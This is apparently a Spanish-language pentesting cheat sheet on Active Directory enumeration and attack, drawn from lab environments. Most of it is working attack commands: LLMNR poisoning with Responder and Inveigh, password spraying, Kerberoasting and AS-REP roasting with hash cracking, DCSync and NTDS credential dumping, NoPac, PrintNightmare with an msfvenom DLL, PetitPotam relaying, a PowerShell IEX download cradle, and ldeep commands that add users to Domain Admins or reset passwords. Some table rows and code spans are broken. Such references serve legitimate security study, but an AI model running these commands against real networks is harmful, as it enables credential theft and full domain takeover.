---
title: "Enumeracion y ataques AD"
description: "Descripcion"
date: "2024-12-01"
tags: ["Bash"]
---




# 🛡️ Guía de Enumeración y Ataques en Active Directory

Este documento es una **cheat sheet traducida y mejorada** para la enumeración y explotación de Active Directory.  
Incluye comandos desde **Linux y Windows**, con explicaciones claras y estructuradas por categoría.  

---

## 📌 1. Enumeración Inicial

| Comando | Descripción |
|---------|-------------|
| `nslookup ns1.inlanefreight.com` | Consulta DNS para descubrir el mapeo de IP ↔ nombre de dominio. |
| `sudo tcpdump -i ens224` | Captura paquetes en la interfaz de red especificada. |
| `sudo responder -I ens224 -A` | Responde y analiza consultas LLMNR, NBT-NS y MDNS en modo pasivo. |
| `fping -asgq 172.16.5.0/23` | Barrido de ping sobre el segmento de red. |
| `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum` | Escaneo Nmap con detección de SO, versión, scripts y traceroute. Resultados guardados en archivo. |

---

## 🔑 2. Kerbrute (Enumeración de Usuarios)

| Comando | Descripción |
|---------|-------------|
| `sudo git clone https://github.com/ropnop/kerbrute.git` | Clona el repositorio de Kerbrute. |
| `make help` | Lista opciones de compilación disponibles. |
| `sudo make all` | Compila binarios para múltiples SO y arquitecturas. |
| `./kerbrute_linux_amd64` | Prueba el binario compilado. |
| `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute` | Mueve el binario a una ruta accesible en el sistema. |
| `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Descubre usuarios del dominio usando una wordlist y exporta los resultados. |

---

## 🕵️ 3. LLMNR/NTB-NS Poisoning

| Comando | Descripción |
|---------|-------------|
| `responder -h` | Muestra ayuda y opciones disponibles en Responder. |
| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Crackea hashes NTLMv2 capturados por Responder con Hashcat. |
| `Import-Module .\Inveigh.ps1` | Importa el módulo Inveigh en PowerShell. |
| `(Get-Command Invoke-Inveigh).Parameters` | Muestra parámetros y funcionalidades de Inveigh. |
| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` | Inicia Inveigh con spoofing LLMNR & NBNS, salida en consola y archivo. |
| `.\Inveigh.exe` | Ejecuta la versión en C# de Inveigh. |

 | Deshabilita NBT-NS en Windows. |

---

## 🔐 4. Password Spraying & Políticas de Contraseñas

| Comando | Descripción |
|---------|-------------|
| `#!/bin/bash   for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do echo $x;done` |Enumera |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` | Enumera política de contraseñas |
| `rpcclient -U "" -N 172.16.5.5` | Conexión SMB nula para info de dominio. |
| `rpcclient $> querydominfo` | Enumera política de contraseñas. |
| `enum4linux -P 172.16.5.5` | Extrae política de contraseñas. |
| `enum4linux-ng -P 172.16.5.5 -oA ilfreight` | Enumera política y exporta en YAML/JSON. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength` |  |
| `net accounts` | Enumera política en Windows. |
| `Import-Module .\PowerView.ps1` | Importa PowerView. |
| `Get-DomainPolicy` | Extrae política con PowerShell. |


## 🛡️ 5. Enumeración de Controles de Seguridad


| Comando | Descripción |
|---------|-------------|
| `Get-MpComputerStatus` | Revisa estado de Windows Defender. |
| `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections` | Muestra políticas de AppLocker. |
| `$ExecutionContext.SessionState.LanguageMode` | Descubre modo de lenguaje en PowerShell. |
| `Find-LAPSDelegatedGroups` | Enumera grupos delegados de LAPS. |
| `Find-AdmPwdExtendedRights` | Chequea permisos extendidos en LAPS. |
| `Get-LAPSComputers` | Enumera equipos con LAPS habilitado. |

---

## 🔑 6. Enumeración con Credenciales Válidas

Incluye **xfreerdp, crackmapexec, smbmap, rpcclient, impacket, windapsearch, BloodHound**, etc.  
👉 Cada comando permite extraer usuarios, grupos, shares, sesiones activas y políticas.


## 🔥 7. Kerberoasting

Incluye:

- `GetUserSPNs.py` (impacket)
- `hashcat -m 13100`
- `setspn.exe`
- `Rubeus.exe kerberoast`
- `mimikatz kerberos::list /export`

👉 Se explica cómo solicitar TGS tickets, exportarlos y crackearlos offline.

---

## 📂 8. ACL Enumeration & Tácticas

- `Get-DomainObjectACL`
- `Convert-NameToSid`
- `Set-DomainUserPassword`
- `Add-DomainGroupMember`
- `Remove-DomainGroupMember`

👉 Permite manipular permisos delegados en AD y persistir acceso.

---

## 🔄 9. DCSync

- `mimikatz # lsadump::dcsync`
- `secretsdump.py -just-dc`
- Variables `$sid` con PowerView

👉 Ataques para replicar hashes desde el Domain Controller.

---

## 🏰 10. Privileged Access

Incluye técnicas para:

- Enumerar **Remote Desktop Users** y **Remote Management Users**.
- `evil-winrm` para acceso remoto.
- `PowerUpSQL` para enumerar instancias SQL.
- `mssqlclient.py` de Impacket con `xp_cmdshell`.

---

## ⚡ 11. NoPac

Explotación de **Sam-The-Admin**:

- `scanner.py` para detectar vulnerabilidad.
- `noPac.py` para obtener SYSTEM shell o hacer DCSync.

---

## 🖨️ 12. PrintNightmare

- Clonar exploit `CVE-2021-1675`.
- Usar `rpcdump.py`.
- Generar payload DLL con `msfvenom`.
- Ejecutar exploit con `CVE-2021-1675.py`.

---

## 🪟 13. PetitPotam

- `PetitPotam.py` para provocar autenticación NTLM.
- `ntlmrelayx.py` para relays a servicios ADCS.
- `gettgtpkinit.py` para tickets TGT con certificados.

---

## 🛠️ 14. Misconfiguraciones Varias

- `adidnsdump` para resolver registros DNS.
- `Get-DomainUser -UACFilter PASSWD_NOTREQD` para cuentas sin requerir contraseña.
- `ls \\domain\SYSVOL\` para revisar GPO scripts.

---

## 🧩 15. Group Policy Enumeration & Ataques

- `gpp-decrypt`
- `crackmapexec -M gpp_autologin`
- `Get-DomainGPO`
- `Get-GPO -All`

---

## 🔥 16. ASREPRoasting

- `Get-DomainUser -PreauthNotRequired`
- `Rubeus.exe asreproast`
- `hashcat -m 18200`
- `kerbrute userenum -d`

---

## 🌐 17. Trust Relationships

- **Child → Parent Trusts**
  - `Get-ADTrust`
  - `Get-DomainTrust`
  - `mimikatz kerberos::golden`

- **Cross-Forest**
  - `Rubeus.exe kerberoast /domain`
  - `GetUserSPNs.py -request -target-domain`
  - `bloodhound-python`

---

## 📦 18. Transferencia de Archivos

| Comando | Descripción |
|---------|-------------|
| `sudo python3 -m http.server 8001` | Levanta servidor HTTP en Linux. |
| `IEX(New-Object Net.WebClient).downloadString('http://IP/SharpHound.exe')` | Descarga archivo con PowerShell. |
| `impacket-smbserver -ip ...` | Monta servidor SMB con Impacket. |


## 🛡️ Enumeración de Active Directory con *ldeep*




```bash
git clone https://github.com/franc-pentest/ldeep.git
cd ldeep
chmod +x ldeep.sh
./ldeep.sh
```

(En Kali viene preinstalado).

🕵️ Enumeración y Explotación
Cada módulo de ldeep permite consultar información distinta vía LDAP:

🔹 Enumerar Computer Objects

Lista todas las cuentas de computadoras en el dominio.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP computers
```

🔹 Enumerar AD metadata

Muestra la partición de configuración de AD.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP conf
```


🔹 Enumerar Delegations

Detecta configuraciones inseguras de delegación.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP delegations
```

🔹 Enumerar Domain Policy

Revela configuraciones críticas de contraseñas y bloqueos.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP domain_policy
```

🔹 Enumerar FSMO Roles

Identifica qué DCs tienen roles FSMO.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP fsmo
```

🔹 Enumerar gMSA credentials

Obtiene credenciales de cuentas de servicio gestionadas.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP gmsa
```

🔹 Enumerar GPOs

Lista objetos de políticas de grupo.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP gpo
```

🔹 Enumerar Groups

Muestra grupos importantes como Domain Admins.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP groups
```

🔹 Enumerar Machine Accounts

Enumera cuentas de equipos.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP machines
```

🔹 Enumerar OUs

Muestra unidades organizacionales.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP ou
```

🔹 Enumerar Certificate Services

Enumera ADCS para detectar abuso de plantillas inseguras.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP pkis
```

🔹 Enumerar Schema

Muestra atributos del esquema de AD.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP schema
```

🔹 Enumerar Certificate Templates

Lista plantillas de certificados (ESC1–ESC8).

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP templates
```

🔹 Enumerar Users

Lista todos los usuarios del dominio.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP users
```

🔹 Enumerar Kerberos pre-authentication

Detecta usuarios con preautenticación deshabilitada.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP users nokrbpreauth
```

🔹 Enumerar SPNs

Muestra usuarios con SPNs asignados.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP users spn -v
```

🔹 Enumerar LAPS

Obtiene contraseñas LAPS almacenadas en AD.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP laps
```

🔹 Enumerar Memberships

Muestra todos los grupos a los que pertenece un usuario.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP memberships usuario -r
```

🔹 Enumerar User Attributes

Muestra atributos sensibles (ej: userPassword).

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP search '(samaccountname=raj)' userPassword
```

🔹 Enumerar Identity

Confirma identidad y credenciales usadas.

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP whoami
```


🔓 Explotación

⚡ Exploitation/Privilege Escalation

Agregar un usuario a Domain Admins:

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP add_to_group "CN=usuario,CN=Users,DC=DOMINIO,DC=LOCAL" "CN=Domain Admins,CN=Users,DC=DOMINIO,DC=LOCAL"

```

⚡ Exploitation/Machine account creation

Crear una cuenta de máquina en AD:

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP create_computer NUEVOPC$ Password@123
```

⚡ Exploitation/User creation

Crear un nuevo usuario de dominio:

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP create_user fakeuser Password@123
```

⚡ Exploitation/Password reset

Resetear la contraseña de un usuario sin conocer la anterior:

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP modify_password fakeuser Password@1
```

⚡ Exploitation/Account unlock

Desbloquear cuentas bloqueadas:

```bash
ldeep ldap -u user -p Password@123 -d dominio.local -s ldap://IP unlock usuario
```

---



## 1️⃣ Acceso remoto

Conectarse al escritorio remoto (RDP):

`xfreerdp /u:Administrator /p:Password321 /v:10.10.224.147:3389`

---

## 2️⃣ Enumeración de recursos y usuarios

### Recursos compartidos

`smbmap -H 10.10.224.147 -u 'Administrator' -p 'Password321' 
`netexec smb 10.10.224.147 -u 'Administrator' -p 'Password321' --shares`

### Enumerar usuarios y servidores

`netexec smb 10.10.224.147 -u 'Administrator' -p 'Password321' --rid-brute`

---

## 3️⃣ Gestión de contraseñas

### Cambiar contraseña de un usuario

`Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password')`

Alternativa usando **BloodyAD**:

`bloodyAD --host '10.10.224.147' -u 'philip' -p 'Claire2008' set password sophie 'Bea123'`

---

## 4️⃣ Reconocimiento avanzado

### Escaneo de usuarios y contraseñas con CrackMapExec

- Enumerar usuarios del dominio:
    

`crackmapexec smb IP(AD) -u usuarios.txt -p diccionario.txt --continue-on-success`

- Solo en un equipo local:
    

`crackmapexec smb IP -u usuarios.txt -p diccionario.txt --local-auth`

- Comprobar privilegios y política de contraseñas:
    

`crackmapexec smb IP -u usuario -p '1234' --continue-on-success `
`crackmapexec smb IP -u usuario -p '1234' --pass-pol `
`crackmapexec smb IP -u usuario -p '1234' --users `

- Dumpear la base de datos del dominio:
    

`crackmapexec smb IP(AD) -u usuario -p '1234' --ntds`

Formato de la respuesta: `Usuario:ID:LM HASH:NTHASH`  
Si LM = `404ee` → LM deshabilitado

---

### Historial de contraseñas

`impacket-secretsdump -just-dc usuario:password@IP -history -pwd-last-secret`

---

### Ataques Kerberos (sin ser admin)

- Obtener SPN y TGS:
    

`impacket-GetUserSPNs -dc-ip IP(AD) dominio.com/usuario:'1234' -request`

- Crackear hash:
    

`hashcat -m 13100 --force -a 0 hash diccionario.txt john --format=krb5tgs --wordlist=diccionario.txt hash`

---

### Kerbrute (fuerza bruta de Kerberos)

`python3 kerbrute.py -users userlist.txt -passwords passwordlist.txt -domain spookysec.local -t 100`

---

### Ataque de usuarios sin contraseña (AS-REP Roasting)

`impacket-GetNPUsers spookysec.local/svc-admin -no-pass john --wordlist=/rockyou.txt hash`

---

## 5️⃣ Validación de credenciales

- Probar acceso con SMB:
    

`crackmapexec smb IP -u 'svc-admin' -p 'Contraseña' 
`smbclient -L spooky.local --user 'svc-admin' --password 'contraseña'`

- Acceder a un recurso compartido:
    

`smbclient \\\\spooky.local\\backup --user svc-admin --password management2005`

- Dumpear credenciales desde un recurso:
    

`impacket-secretsdump -just-dc backup@spookysec.local`

---

